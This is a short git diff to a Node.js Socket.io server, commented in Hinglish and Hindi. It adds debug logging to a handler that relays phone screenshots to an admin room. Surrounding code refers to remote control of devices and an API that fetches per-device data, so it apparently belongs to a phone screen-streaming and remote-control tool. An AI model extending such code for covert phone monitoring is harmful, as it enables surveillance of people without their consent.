@@ -55,14 +55,20 @@ io.on('connection', (socket) => {
     // Phone screen ki images bhejega, hum admin ko forward karenge
     
     socket.on('screen-data', (data) => {
-        const { room, image } = data;
-           if (image) {
-            console.log(`📸 [SCREEN] Received image from: ${room} | Size: ${(image.length / 1024).toFixed(2)} KB`);
+       const room = data.room;
+        const image = data.image;
+
+        if (image) {
+            // ✅ यह लाइन अब टर्मिनल में 100% दिखेगी अगर फोन डेटा भेज रहा है
+            console.log(`📸 [DEBUG] Room: ${room} | Image Received! Size: ${(image.length / 1024).toFixed(2)} KB`);
+            
+            // एडमिन पैनल को सही फॉर्मेट में भेजें
+            socket.to(room).emit('screen-data', { image: image }); 
         } else {
-            console.log(`⚠️ [SCREEN] Received empty data from: ${room}`);
+            console.log(`⚠️ [DEBUG] Data received but NO IMAGE found from room: ${room}`);
         }
         // Sirf us room me bhejo (Admin ko milega)
-        socket.to(room).emit('screen-data', image);
+      
     });
 
     // 3. REMOTE CONTROL (Admin -> Device)
@@ -236,4 +242,5 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
 
 // ✅ IMPORTANT: "server.listen" instead of "app.listen" for Socket.io
 server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} WITH SOCKET.IO`));
+
 
